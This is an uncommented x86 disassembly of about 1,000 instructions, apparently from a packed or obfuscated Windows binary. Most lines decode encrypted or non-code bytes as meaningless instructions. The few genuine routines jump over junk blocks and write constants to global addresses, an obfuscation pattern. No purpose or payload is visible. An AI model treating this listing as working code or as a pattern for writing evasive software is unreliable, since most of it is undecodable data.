  4095b7:	mov    fs,WORD PTR [eax+0x7df576f5]
  4095bd:	inc    DWORD PTR [esi]
  4095bf:	fwait
  4095c0:	push   edx
  4095c1:	ret    0x35d3
  4095c4:	jnp    0x409637
  4095c6:	cmp    BYTE PTR [ecx-0x254b3f2b],dl
  4095cc:	mov    al,ds:0x54e03e8e
  4095d1:	fs mov edi,0x8fbc054b
  4095d7:	jo     0x4095d9
  4095d9:	lock fcomp DWORD PTR [esi]
  4095dc:	push   ds
  4095dd:	pop    ebp
  4095de:	out    0x7e,al
  4095e0:	ins    BYTE PTR es:[edi],dx
  4095e1:	shr    BYTE PTR [edi],cl
  4095e3:	pop    eax
  4095e4:	cmp    edi,DWORD PTR [edi+0x5e1022f]
  4095ea:	call   0x406b0f
  4095ef:	jmp    0x409836
  4095f4:	loope  0x40958c
  4095f6:	jmp    0x3d73:0xf1606904
  4095fd:	clc    
  4095fe:	jmp    0x8e35:0xb1b6a44e
  409605:	fstp   TBYTE PTR [esi+0x7e]
  409608:	and    al,0x7c
  40960a:	jle    0x40968a
  40960c:	xor    dl,bl
  40960e:	push   es
  40960f:	push   edx
  409610:	dec    edi
  409611:	mov    dh,0xdc
  409613:	adc    edx,DWORD PTR [eax-0x3ac85769]
  409619:	call   FWORD PTR [esi]
  40961b:	shl    BYTE PTR ds:0xa9aca242,cl
  409621:	pop    ebp
  409622:	mov    ds:0x84bb1484,eax
  409627:	sar    ah,0xa3
  40962a:	sahf   
  40962b:	pop    ebx
  40962c:	sbb    al,0xae
  40962e:	cs jp  0x40963b
  409631:	dec    eax
  409632:	and    eax,esi
  409634:	inc    esi
  409635:	cdq    
  409636:	or     DWORD PTR [esi-0x32e71a42],ebx
  40963c:	mov    dh,0xad
  40963e:	jbe    0x40969f
  409640:	xor    DWORD PTR [ebx-0x43f14fe3],esp
  409646:	pop    ds
  409647:	loope  0x4096c1
  409649:	and    BYTE PTR [ecx],0xe5
  40964c:	jle    0x409640
  40964e:	xchg   edi,eax
  40964f:	push   edi
  409650:	enter  0xd159,0x6e
  409654:	cld    
  409655:	les    edi,FWORD PTR [esi]
  409657:	push   ebp
  409658:	xchg   ebp,ebp
  40965a:	sbb    ch,dl
  40965c:	imul   ebx,ecx,0x22
  40965f:	fmul   DWORD PTR [ebp+0x479f7718]
  409665:	int    0x59
  409667:	xor    dl,dl
  409669:	mov    DWORD PTR [ebx-0x20ce735],ebp
  40966f:	xchg   ebp,eax
  409670:	dec    ebp
  409671:	not    BYTE PTR ds:0x7d28edb5
  409677:	inc    ebx
  409678:	jbe    0x409623
  40967a:	push   ss
  40967b:	pushf  
  40967c:	inc    eax
  40967d:	cmp    ecx,DWORD PTR [esi-0x4aeff145]
  409683:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409684:	cmp    BYTE PTR [eax-0x6b975381],al
  40968a:	adc    ecx,DWORD PTR [ecx]
  40968c:	sbb    ebp,DWORD PTR [eax-0x31]
  40968f:	jg     0x409693
  409691:	cmp    BYTE PTR [ecx+0xa3389e],ah
  409697:	xchg   DWORD PTR [edx-0x73],ebp
  40969a:	mov    esp,DWORD PTR [ecx]
  40969c:	fwait
  40969d:	or     BYTE PTR [eax],dh
  40969f:	adc    DWORD PTR [ebx-0x29],esi
  4096a2:	lods   al,BYTE PTR ds:[esi]
  4096a3:	dec    edx
  4096a4:	cmp    eax,0x4e880722
  4096a9:	adc    al,0xbe
  4096ab:	push   esi
  4096ac:	imul   eax
  4096ae:	inc    esi
  4096af:	cmp    dl,dh
  4096b1:	jbe    0x409688
  4096b3:	cs fwait
  4096b5:	sbb    BYTE PTR [ebx+eiz*2+0x7b],0x3c
  4096ba:	cmp    al,0xd5
  4096bc:	mov    ecx,0x8a385385
  4096c1:	das    
  4096c2:	enter  0x1fe3,0xd5
  4096c6:	xor    dh,bl
  4096c8:	aam    0xf6
  4096ca:	js     0x4096f1
  4096cc:	test   DWORD PTR [ebp-0x692ff150],esi
  4096d2:	shr    BYTE PTR [edi-0x46e5e602],0xa0
  4096d9:	fst    DWORD PTR [edi-0x6685cfdf]
  4096df:	sub    ecx,DWORD PTR [ebp+0x5f]
  4096e2:	dec    ecx
  4096e3:	adc    BYTE PTR [edi+0x7d],ah
  4096e6:	add    BYTE PTR [ecx-0x4a0243cb],0xf5
  4096ed:	lds    ecx,FWORD PTR [edx]
  4096ef:	test   ah,cl
  4096f1:	mov    edx,0x4822b6cc
  4096f6:	in     al,0x6d
  4096f8:	cmp    edi,esi
  4096fa:	sbb    BYTE PTR [eax+0x26],0xce
  4096fe:	retf   0x83d7
  409701:	(bad)  
  409702:	aas    
  409703:	inc    ebx
  409704:	mov    dl,0xee
  409706:	mov    WORD PTR [edx-0x37],?
  409709:	lods   eax,DWORD PTR ds:[esi]
  40970a:	fsin   
  40970c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40970d:	(bad)  
  40970f:	std    
  409710:	(bad)  
  409711:	jmp    0x40976c
  409713:	dec    eax
  409714:	cmp    ebx,eax
  409716:	test   DWORD PTR [esi-0x21],0xdf746b5f
  40971d:	xor    edx,edi
  40971f:	mov    ah,0x56
  409721:	sub    eax,0x1875c8c0
  409726:	add    ebp,DWORD PTR [ebp+0x6f]
  409729:	call   0x339d:0xe6a6a00e
  409730:	test   BYTE PTR [ebx+0x5e],bh
  409733:	stc    
  409734:	out    0xb6,eax
  409736:	mov    al,ds:0xdc91ace6
  40973b:	jns    0x40977d
  40973d:	mov    dh,0x23
  40973f:	in     eax,dx
  409740:	sbb    BYTE PTR [edx],bl
  409742:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409743:	fcomi  st,st(6)
  409745:	cmc    
  409746:	sub    al,0x3e
  409748:	push   ss
  409749:	sub    esp,ebx
  40974b:	rcr    BYTE PTR [ebp+0x7f],1
  40974e:	inc    edx
  40974f:	mov    esi,0x9d1d5694
  409754:	pop    esp
  409755:	imul   edi,DWORD PTR [eax+0x5f1af88b],0xffffff82
  40975c:	pop    es
  40975d:	loopne 0x4097ae
  40975f:	hlt    
  409760:	aas    
  409761:	sub    BYTE PTR [esi],cl
  409763:	push   esi
  409764:	mov    al,0x20
  409766:	retf   
  409767:	bound  eax,QWORD PTR [ebx-0x47]
  40976a:	lds    ebx,FWORD PTR [ebx]
  40976c:	idiv   DWORD PTR [eax+0x13]
  40976f:	sub    cl,dl
  409771:	fmulp  st(2),st
  409773:	and    edi,DWORD PTR [ebx-0x4edacafe]
  409779:	cmp    al,ch
  40977b:	cmp    edx,ebx
  40977d:	inc    eax
  40977e:	or     esi,DWORD PTR [edx]
  409780:	sbb    esp,DWORD PTR [edi+0xe7f859]
  409786:	push   ss
  409787:	psrld  mm5,QWORD PTR [edi+0x5e]
  40978b:	fcomp  QWORD PTR [ecx+eiz*1]
  40978e:	in     al,0x8e
  409790:	nop
  409791:	out    dx,al
  409792:	mov    edi,ebx
  409794:	fs shr eax,0x7b
  409798:	mov    ah,0xcb
  40979a:	sahf   
  40979b:	jg     0x409815
  40979d:	inc    edx
  40979e:	xchg   ecx,eax
  40979f:	sub    cl,BYTE PTR [esp+ebx*8]
  4097a2:	sub    BYTE PTR [edi],bh
  4097a4:	push   eax
  4097a5:	push   ds
  4097a6:	jae    0x4097eb
  4097a8:	mov    edi,0xf195a0d6
  4097ad:	imul   esp,DWORD PTR [esi+0x46],0xfffffffe
  4097b1:	sbb    DWORD PTR [edi+0x3087dc65],esi
  4097b7:	scas   al,BYTE PTR es:[edi]
  4097b8:	popf   
  4097b9:	mov    ch,BYTE PTR [edi]
  4097bb:	xlat   BYTE PTR ds:[ebx]
  4097bc:	sub    esp,DWORD PTR [esi-0x30]
  4097bf:	add    al,0x15
  4097c1:	retf   
  4097c2:	icebp  
  4097c3:	jg     0x4097a1
  4097c5:	out    dx,eax
  4097c6:	(bad)  
  4097c7:	lock add al,0x23
  4097ca:	push   ss
  4097cb:	and    ecx,ebp
  4097cd:	inc    ebp
  4097ce:	jmp    0xaec27293
  4097d3:	mov    eax,0xe853812d
  4097d8:	(bad)  
  4097da:	mov    edx,DWORD PTR [eax+0x11]
  4097dd:	inc    edx
  4097de:	arpl   si,bx
  4097e0:	sbb    cl,BYTE PTR [edi+edx*8]
  4097e3:	mov    al,0x1c
  4097e5:	dec    ecx
  4097e6:	and    DWORD PTR ds:0x2836a101,0xa36ebc04
  4097f0:	mov    eax,0xf49f6440
  4097f5:	add    BYTE PTR [edi+0x4c],bh
  4097f8:	loop   0x4097d9
  4097fa:	nop
  4097fb:	jns    0x40986f
  4097fd:	aam    0x1c
  4097ff:	push   edi
  409800:	nop
  409801:	sbb    edi,DWORD PTR [ebx+ecx*1-0x180a9c34]
  409808:	cmp    edi,DWORD PTR [ecx+eiz*4+0x125787d3]
  40980f:	jmp    0x8badaa5b
  409814:	das    
  409815:	or     al,0xcc
  409817:	bound  esi,QWORD PTR [edx-0x2c]
  40981a:	cs call 0x3110:0xb9b21ae4
  409822:	retf   
  409823:	dec    esp
  409824:	lea    edi,[esi+0x45]
  409827:	into   
  409828:	pop    ds
  409829:	adc    dl,BYTE PTR [esi+0x3d691602]
  40982f:	add    ch,bl
  409831:	dec    ebp
  409832:	or     BYTE PTR [ecx+0x49],0xdf
  409836:	mov    eax,DWORD PTR [ebp-0xc]
  409839:	cmp    eax,ebx
  40983b:	je     0x40892f
  409841:	mov    eax,DWORD PTR [ebp-0x8]
  409844:	mov    eax,DWORD PTR [eax]
  409846:	pop    edi
  409847:	pop    esi
  409848:	pop    ebx
  409849:	leave  
  40984a:	ret    0xc
  40984d:	push   ebp
  40984e:	mov    ebp,esp
  409850:	sub    esp,0x30
  409853:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40985a:	add    ecx,0x13ba
  409860:	mov    DWORD PTR [ebp-0x18],0xf89c8532
  409867:	xor    ecx,ecx
  409869:	xor    ecx,DWORD PTR ds:0x43375f
  40986f:	xor    DWORD PTR ds:0x433697,ecx
  409875:	mov    ecx,DWORD PTR [ebp-0x4]
  409878:	push   ebx
  409879:	sub    eax,eax
  40987b:	mov    eax,0x7510854
  409880:	add    DWORD PTR ds:0x43375b,0x43372b
  40988a:	xor    ecx,eax
  40988c:	mov    ebx,0x32729b
  409891:	add    ecx,ebx
  409893:	or     DWORD PTR ds:0x4336e7,0x433793
  40989d:	mov    DWORD PTR [ebp-0x1c],ecx
  4098a0:	mov    ecx,DWORD PTR ds:0x43367b
  4098a6:	sub    DWORD PTR ds:0x43375f,ecx
  4098ac:	mov    ecx,DWORD PTR [ebp+0x14]
  4098af:	jmp    0x409b12
  4098b4:	shr    DWORD PTR [ebx+0x7570c4c2],0xc1
  4098bb:	stos   DWORD PTR es:[edi],eax
  4098bc:	fadd   st(6),st
  4098be:	cwde   
  4098bf:	pushf  
  4098c0:	jb     0x409866
  4098c2:	int    0xa
  4098c4:	mov    ah,0xd9
  4098c6:	jle    0x409946
  4098c8:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  4098cc:	pop    esi
  4098cd:	sbb    DWORD PTR [ebp-0x62f2ad5],0x1e
  4098d4:	mov    ebp,0xf05da665
  4098d9:	add    DWORD PTR [edx],ecx
  4098db:	adc    BYTE PTR [edx-0xbcdda55],ch
  4098e1:	iret   
  4098e2:	fnstcw WORD PTR [esi+eiz*2]
  4098e5:	push   0xa898483
  4098ea:	xlat   BYTE PTR ds:[ebx]
  4098eb:	out    dx,al
  4098ec:	(bad)  
  4098ed:	sub    ecx,DWORD PTR [esi-0x2def4485]
  4098f3:	in     al,0xbb
  4098f5:	fld    TBYTE PTR [esi-0x32]
  4098f8:	and    BYTE PTR [edx+0x35],bh
  4098fb:	cmp    esi,ebx
  4098fd:	clc    
  4098fe:	cld    
  4098ff:	(bad)  
  409900:	pusha  
  409901:	pushf  
  409902:	cli    
  409903:	sub    BYTE PTR [ecx],ah
  409905:	leave  
  409906:	push   edx
  409907:	outs   dx,DWORD PTR ds:[esi]
  409908:	mov    ch,dl
  40990a:	into   
  40990b:	fadd   DWORD PTR [edx]
  40990d:	sub    al,0x62
  40990f:	dec    ebx
  409910:	mov    cl,0x5f
  409912:	jbe    0x40994d
  409914:	daa    
  409915:	push   esi
  409916:	sub    BYTE PTR [esi-0x1f6b9d2b],al
  40991c:	jb     0x409993
  40991e:	jns    0x409921
  409920:	adc    ah,BYTE PTR [ecx-0x22]
  409923:	jecxz  0x4098f4
  409925:	in     al,dx
  409926:	out    0xa,al
  409928:	les    ebp,FWORD PTR [ecx+eiz*4-0xc]
  40992c:	sub    bh,BYTE PTR [edi]
  40992e:	cmp    eax,0x6fbb7558
  409933:	push   ebx
  409934:	ret    0xae0f
  409937:	xor    dl,cl
  409939:	idiv   DWORD PTR [esi]
  40993b:	pusha  
  40993c:	xor    ch,bl
  40993e:	repnz xchg cl,cl
  409941:	xor    bh,BYTE PTR [ecx]
  409943:	push   0x2037d492
  409948:	into   
  409949:	jl     0x4098cb
  40994b:	lds    edi,FWORD PTR ss:[ebx]
  40994e:	mov    ch,BYTE PTR [eax-0x50]
  409951:	out    dx,al
  409952:	cli    
  409953:	inc    esi
  409954:	fiadd  WORD PTR [ecx-0x73546d14]
  40995a:	jae    0x409979
  40995c:	out    0xfb,eax
  40995e:	aam    0x2d
  409960:	sub    al,0x9c
  409962:	cmp    al,0x50
  409964:	mov    ecx,0x7e114561
  409969:	cdq    
  40996a:	in     al,0x4c
  40996c:	cmp    al,0x64
  40996e:	jmp    0x1f7:0xea3c8aac
  409975:	ss out dx,al
  409977:	mov    DWORD PTR [ebx],edx
  409979:	inc    esp
  40997a:	js     0x4099de
  40997c:	adc    edi,eax
  40997e:	data16 std 
  409980:	dec    ebx
  409981:	jmp    0xcf40:0x2c60566e
  409988:	push   edx
  409989:	arpl   WORD PTR [eax+0x3e11ab89],bp
  40998f:	call   0xd82d:0x5c6099e5
  409996:	scas   eax,DWORD PTR es:[edi]
  409997:	inc    esp
  409998:	push   ss
  409999:	inc    eax
  40999a:	iret   
  40999b:	mov    esp,DWORD PTR [edi+0x73]
  40999e:	jmp    0xdf87:0xd552883a
  4099a5:	jge    0x4099e9
  4099a7:	ret    0x385f
  4099aa:	ja     0x409a24
  4099ac:	push   eax
  4099ad:	xchg   edx,eax
  4099ae:	(bad)  
  4099af:	in     eax,dx
  4099b0:	inc    esp
  4099b1:	data16 (bad) 
  4099b3:	mov    esp,0xeeb8c614
  4099b8:	into   
  4099b9:	inc    esi
  4099ba:	arpl   WORD PTR [ebp+edx*8-0xfef9d3f],dx
  4099c1:	mov    ch,0x97
  4099c3:	pop    es
  4099c4:	in     eax,0xd
  4099c6:	mov    WORD PTR [edi],ds
  4099c8:	test   BYTE PTR [edi+0x12],ch
  4099cb:	jp     0x4099e7
  4099cd:	xchg   ebx,eax
  4099ce:	retf   0x9cf0
  4099d1:	lahf   
  4099d2:	mov    ebx,0xc1efa5d8
  4099d7:	js     0x4099ba
  4099d9:	xchg   esp,eax
  4099da:	adc    BYTE PTR [edx],cl
  4099dc:	fsubr  QWORD PTR [ecx+ebp*4]
  4099df:	fs push ecx
  4099e1:	iret   
  4099e2:	lea    ebp,[esi-0x3d]
  4099e5:	neg    DWORD PTR fs:[ebx]
  4099e8:	pop    ebp
  4099e9:	(bad)  
  4099ea:	sub    eax,0xf9fb2879
  4099ef:	(bad)  
  4099f0:	hlt    
  4099f1:	and    edx,DWORD PTR [esi+0x56e9d498]
  4099f7:	fadd   QWORD PTR [edx+0x6c]
  4099fa:	xor    al,0x58
  4099fc:	and    al,BYTE PTR ds:0xd23daad
  409a02:	out    dx,al
  409a03:	and    ecx,esi
  409a05:	test   DWORD PTR [ebx-0x55],eax
  409a08:	pop    ds
  409a09:	sub    cl,cl
  409a0b:	aaa    
  409a0c:	add    DWORD PTR [ebx+0x7803852d],0x615a3ac1
  409a16:	out    0x72,eax
  409a18:	mov    edx,0xd77c1191
  409a1d:	cmp    eax,0x32eb58f3
  409a22:	jno    0x409a54
  409a24:	std    
  409a25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a26:	mov    ah,0x76
  409a28:	out    0x91,eax
  409a2a:	mov    fs,WORD PTR [ebp-0x28]
  409a2d:	xchg   edx,eax
  409a2e:	or     DWORD PTR [eax+0x54],edx
  409a31:	mov    dh,0xda
  409a33:	xlat   BYTE PTR ds:[ebx]
  409a34:	cdq    
  409a35:	mov    dh,0x12
  409a37:	(bad)  
  409a38:	jmp    0x409a19
  409a3a:	push   ebx
  409a3b:	fadd   st(1),st
  409a3d:	bound  edx,QWORD PTR [eax+ebp*1-0x6cd49a7b]
  409a44:	js     0x409a37
  409a46:	fldcw  WORD PTR [edx+0x7a9d76bd]
  409a4c:	xor    dh,BYTE PTR [ebp-0x55]
  409a4f:	pop    di
  409a51:	in     eax,dx
  409a52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a53:	and    eax,0x36cbb55
  409a58:	push   es
  409a59:	aam    0x69
  409a5b:	add    BYTE PTR [edi+eax*4+0xf32072d],ah
  409a62:	imul   ecx,DWORD PTR [ebx+0x2e95b1d2],0xffffffb0
  409a69:	test   ecx,0xfff525bb
  409a6f:	mov    al,0x8d
  409a71:	and    ebx,esp
  409a73:	in     al,dx
  409a74:	scas   al,BYTE PTR es:[edi]
  409a75:	fwait
  409a76:	mov    eax,0xa5297ed8
  409a7b:	pop    ds
  409a7c:	rcl    DWORD PTR [edx+esi*8-0x5c],0x40
  409a81:	(bad)  
  409a82:	fdivr  QWORD PTR [eax]
  409a84:	mov    eax,ds:0x2047c339
  409a89:	mov    ebx,0x326ec3d0
  409a8e:	push   ds
  409a8f:	aam    0x4a
  409a91:	mov    esi,0xe21d78c1
  409a96:	outs   dx,DWORD PTR ds:[esi]
  409a97:	fdiv   QWORD PTR [esp+ebx*4-0x80]
  409a9b:	add    DWORD PTR [edx],esp
  409a9d:	or     ah,BYTE PTR [esi+edi*1-0x62]
  409aa1:	pop    esp
  409aa2:	xor    DWORD PTR [esi-0x874c2eb],ebx
  409aa8:	mov    ch,al
  409aaa:	jo     0x409a5d
  409aac:	push   0xabc14f85
  409ab1:	adc    al,0xc
  409ab3:	out    dx,al
  409ab4:	sub    ebx,DWORD PTR [esi+eax*4]
  409ab7:	emms   
  409ab9:	pop    ebx
  409aba:	or     eax,0xa1388708
  409abf:	push   edi
  409ac0:	xor    al,0x2e
  409ac2:	mov    edx,0x15854334
  409ac7:	adc    DWORD PTR [ebp-0x1797e81d],edi
  409acd:	and    BYTE PTR [ebx+0xd],bh
  409ad0:	test   DWORD PTR [edi+0x411262a5],ecx
  409ad6:	mov    edi,0x7b4559a9
  409adb:	add    eax,0x90072d0f
  409ae0:	adc    al,BYTE PTR [edx+ecx*8-0x305caaf2]
  409ae7:	inc    ebx
  409ae8:	aad    0x6f
  409aea:	loope  0x409b29
  409aec:	pop    ebp
  409aed:	arpl   WORD PTR [ebx],si
  409aef:	dec    edx
  409af0:	push   esi
  409af1:	(bad)  
  409af2:	das    
  409af3:	neg    DWORD PTR ds:0xda840795
  409af9:	sub    cl,BYTE PTR ds:0x2c76602c
  409aff:	retf   
  409b00:	or     cl,BYTE PTR [esp+0x1d]
  409b04:	aam    0x11
  409b06:	int    0x68
  409b08:	jge    0x409a8b
  409b0a:	jmp    0x8c86:0xdcaf9877
  409b11:	xchg   esi,eax
  409b12:	push   esi
  409b13:	push   edi
  409b14:	sbb    DWORD PTR ds:0x43371f,0x4336d3
  409b1e:	jmp    0x409d81
  409b23:	lds    esp,FWORD PTR [edi-0x2e932d54]
  409b29:	popa   
  409b2a:	mov    cl,0x92
  409b2c:	fisttp QWORD PTR [edi+0x2bfa95d4]
  409b32:	or     edi,DWORD PTR [esi-0x1c]
  409b35:	jle    0x409bb5
  409b37:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  409b3b:	mov    ebp,0x4e54388a
  409b40:	mov    ds:0xfb705d45,al
  409b45:	vmread edx,ebx
  409b48:	xchg   edi,eax
  409b49:	aam    0x6a
  409b4b:	add    al,0x4a
  409b4d:	leave  
  409b4e:	dec    ecx
  409b4f:	shr    DWORD PTR [edx],1
  409b51:	adc    DWORD PTR [esi-0x3df767e8],edx
  409b57:	retf   0xc108
  409b5a:	jp     0x409aeb
  409b5c:	push   edx
  409b5d:	add    dh,bl
  409b5f:	jmp    0x409bda
  409b61:	nop
  409b62:	adc    eax,0x33274624
  409b67:	or     edi,DWORD PTR [edx+edx*8+0x5fbb0f56]
  409b6e:	test   eax,0x40e775fa
  409b73:	lods   al,BYTE PTR ds:[esi]
  409b74:	popw   ss
  409b76:	mov    al,0x7d
  409b78:	and    DWORD PTR [edi],edi
  409b7a:	iret   
  409b7b:	gs xor eax,0x5d105fab
  409b81:	sbb    al,0xc2
  409b83:	retf   
  409b84:	or     DWORD PTR [ebx-0x19],0x60
  409b88:	fisub  DWORD PTR [edx]
  409b8a:	xor    DWORD PTR [ebp+0x164f0804],esi
  409b90:	xchg   bl,dl
  409b92:	mov    ecx,0x487379fb
  409b97:	outs   dx,DWORD PTR ds:[esi]
  409b98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b99:	or     cl,BYTE PTR [ebx]
  409b9b:	cmp    dh,dh
  409b9d:	pop    ss
  409b9e:	and    al,0xcc
  409ba0:	in     al,0x92
  409ba2:	add    eax,0xf58c1a7b
  409ba7:	lods   al,BYTE PTR ds:[esi]
  409ba8:	jbe    0x409b90
  409baa:	out    dx,al
  409bab:	das    
  409bac:	or     ch,BYTE PTR [ebx+0x14]
  409baf:	enter  0x50a4,0xb3
  409bb3:	out    dx,eax
  409bb4:	pop    ebx
  409bb5:	add    ebp,ebx
  409bb7:	leave  
  409bb8:	sahf   
  409bb9:	popf   
  409bba:	(bad)  
  409bbc:	jle    0x409c12
  409bbe:	or     DWORD PTR [esi],eax
  409bc0:	(bad)  
  409bc1:	int3   
  409bc2:	nop
  409bc3:	pop    ecx
  409bc4:	xlat   BYTE PTR ds:[ebx]
  409bc5:	in     al,dx
  409bc6:	aaa    
  409bc7:	arpl   di,di
  409bc9:	pop    esi
  409bca:	in     eax,0xe2
  409bcc:	push   ebp
  409bcd:	xor    BYTE PTR [esi-0x469ded50],dh
  409bd3:	std    
  409bd4:	loop   0x409ba4
  409bd6:	cmp    ah,BYTE PTR [edi+0x2665706e]
  409bdc:	mov    edx,fs
  409bde:	rcr    BYTE PTR [edx+0x1ed2dd64],1
  409be4:	aaa    
  409be5:	mov    ebx,0x8ea3c252
  409bea:	je     0x409bdc
  409bec:	ds cdq 
  409bee:	enter  0xbea2,0xc9
  409bf2:	adc    edx,esp
  409bf4:	scas   al,BYTE PTR es:[edi]
  409bf5:	ins    BYTE PTR es:[edi],dx
  409bf6:	rcr    BYTE PTR [ebp-0x7de98696],1
  409bfc:	ficom  DWORD PTR [edx]
  409bfe:	fisttp QWORD PTR [edx-0x5db410eb]
  409c04:	push   ebp
  409c05:	jle    0x409bfa
  409c07:	cmp    ecx,DWORD PTR [edi-0x505630a3]
  409c0d:	(bad)  
  409c0e:	(bad)  
  409c0f:	add    al,BYTE PTR [esi+0x5b481fbc]
  409c15:	and    al,0xda
  409c17:	add    bh,BYTE PTR [ebx-0x4595d006]
  409c1d:	test   bh,al
  409c1f:	ins    BYTE PTR es:[edi],dx
  409c20:	fdiv   DWORD PTR [ebx+0x4c]
  409c23:	pop    es
  409c24:	test   al,0x86
  409c26:	or     ecx,DWORD PTR [ebx-0x3a]
  409c29:	loopne 0x409c15
  409c2b:	inc    esp
  409c2c:	call   0x2acd776d
  409c31:	push   edi
  409c32:	mov    eax,0xdfe2fce3
  409c37:	and    eax,0x6a867ee2
  409c3c:	mov    ?,WORD PTR [edx+eiz*2+0x37387505]
  409c43:	stc    
  409c44:	and    eax,0x3bad0088
  409c49:	or     cl,cl
  409c4b:	iret   
  409c4c:	inc    edi
  409c4d:	inc    ebx
  409c4e:	sub    al,0x58
  409c50:	adc    BYTE PTR [ecx-0x59],0xea
  409c54:	xchg   edx,eax
  409c55:	popa   
  409c56:	ret    
  409c57:	ds dec esi
  409c59:	jno    0x409ccb
  409c5b:	lea    ebp,[ebp-0x745bee49]
  409c61:	rol    DWORD PTR [esp+edi*2+0x26d0c0d0],1
  409c68:	and    eax,0x4f027554
  409c6d:	hlt    
  409c6e:	ss stos DWORD PTR es:[edi],eax
  409c70:	xchg   ebp,eax
  409c71:	das    
  409c72:	mov    eax,0x95b7490a
  409c77:	add    DWORD PTR [edx+0x72],0x45889e22
  409c7e:	cs jl  0x409c19
  409c81:	mov    ebp,0x31c8013a
  409c86:	int    0x9d
  409c88:	mov    ds,edx
  409c8a:	pop    esi
  409c8b:	pop    ecx
  409c8c:	sbb    al,0x30
  409c8e:	push   eax
  409c8f:	stos   DWORD PTR es:[edi],eax
  409c90:	dec    ecx
  409c92:	lods   eax,DWORD PTR ds:[esi]
  409c93:	jg     0x409c29
  409c95:	pop    ds
  409c96:	cwde   
  409c97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c98:	cmp    bh,ah
  409c9a:	je     0x409c99
  409c9c:	retf   
  409c9d:	pop    es
  409c9e:	sahf   
  409c9f:	mov    eax,ds:0xd89752bf
  409ca4:	(bad)
  409ca7:	pop    edi
  409ca8:	mov    edx,0x39aee90e
  409cad:	in     ax,dx
  409caf:	cmc    
  409cb0:	hlt    
  409cb1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409cb2:	or     ecx,DWORD PTR [ebp-0x1efba54d]
  409cb8:	dec    esp
  409cb9:	fsub   DWORD PTR [edi-0x4742062c]
  409cbf:	add    DWORD PTR [edx-0x37],edx
  409cc2:	mov    dh,BYTE PTR [eax+0x6fa394aa]
  409cc8:	in     al,0x85
  409cca:	les    esi,FWORD PTR [esi]
  409ccc:	imul   esi,DWORD PTR [esi+eax*8+0x57a95fc1],0xfffffff1
  409cd4:	int    0xc6
  409cd6:	dec    ecx
  409cd7:	or     DWORD PTR [ecx+0xe],ebx
  409cda:	sbb    DWORD PTR [edi*4+0x50a7aee2],0x5cf6f1fb
  409ce5:	cdq    
  409ce6:	dec    ebp
  409ce7:	push   0x924d26b4
  409cec:	xchg   ebx,eax
  409ced:	mov    dl,0x92
  409cef:	add    ebp,ebp
  409cf1:	xlat   BYTE PTR ds:[ebx]
  409cf2:	in     al,dx
  409cf3:	sub    ecx,DWORD PTR [ebx]
  409cf5:	mov    al,ds:0x3b12b7a7
  409cfa:	xchg   ebp,eax
  409cfb:	aad    0xb8
  409cfd:	inc    eax
  409cfe:	loope  0x409ca0
  409d00:	in     eax,dx
  409d01:	bound  ecx,QWORD PTR [eax]
  409d03:	pop    ss
  409d04:	jns    0x409d81
  409d06:	stos   BYTE PTR es:[edi],al
  409d07:	sar    DWORD PTR [esi],1
  409d09:	push   edx
  409d0a:	stos   DWORD PTR es:[edi],eax
  409d0b:	add    ebp,DWORD PTR [eax+edi*8]
  409d0e:	adc    DWORD PTR [edx],eax
  409d10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409d11:	or     DWORD PTR [ecx],ebp
  409d13:	xchg   BYTE PTR [ecx-0x7a],dh
  409d16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409d17:	inc    ebp
  409d18:	std    
  409d19:	js     0x409cb2
  409d1b:	in     eax,0xc5
  409d1d:	inc    edi
  409d1e:	imul   esi,DWORD PTR [edx],0xffffffcd
  409d21:	stc    
  409d22:	imul   ebp,DWORD PTR [edi],0x6a
  409d25:	pop    edx
  409d26:	sbb    eax,0x92961ae9
  409d2b:	xor    ecx,DWORD PTR [edx+0x78ec9827]
  409d31:	clc    
  409d32:	imul   ebx,DWORD PTR ds:0x24c3c1fe,0xffffffb8
  409d39:	pop    es
  409d3a:	cmp    eax,0x5e285db1
  409d3f:	mov    esi,0x860825d0
  409d44:	add    al,0xae
  409d46:	outs   dx,DWORD PTR ds:[esi]
  409d47:	je     0x409cd9
  409d49:	add    BYTE PTR [edx+0x3e3ee44d],ch
  409d4f:	loop   0x409d0a
  409d51:	stc    
  409d52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409d53:	pop    ds
  409d54:	stos   BYTE PTR es:[edi],al
  409d55:	(bad)  
  409d56:	pop    ebp
  409d57:	push   ebx
  409d58:	popf   
  409d59:	cmp    ebp,eax
  409d5b:	iret   
  409d5c:	scas   eax,DWORD PTR es:[edi]
  409d5d:	adc    edx,DWORD PTR [ebx-0x36b7aa77]
  409d63:	rol    BYTE PTR [ebx],1
  409d65:	xor    DWORD PTR [ebx+0x26],ecx
  409d68:	adc    BYTE PTR [ebp+edx*1+0x185d4ae3],dl
  409d6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d70:	mov    fs,WORD PTR [esi-0xa]
  409d73:	outs   dx,DWORD PTR ds:[esi]
  409d74:	xchg   ecx,eax
  409d75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409d76:	repz push edx
  409d78:	(bad)  
  409d79:	dec    edi
  409d7a:	or     edx,ebp
  409d7c:	mov    edi,0x6736f487
  409d81:	test   ecx,ecx
  409d83:	mov    DWORD PTR ds:0x433697,0x34e7
  409d8d:	je     0x409da7
  409d93:	mov    ecx,DWORD PTR [ebp+0x14]
  409d96:	mov    edi,DWORD PTR ds:0x43368b
  409d9c:	sub    DWORD PTR ds:0x43375f,edi
  409da2:	mov    ecx,DWORD PTR [ecx]
  409da4:	mov    DWORD PTR [ebp-0x1c],ecx
  409da7:	or     DWORD PTR ds:0x4336d3,ebx
  409dad:	jmp    0x40a010
  409db2:	push   eax
  409db3:	call   FWORD PTR [esi+0x50697168]
  409db9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
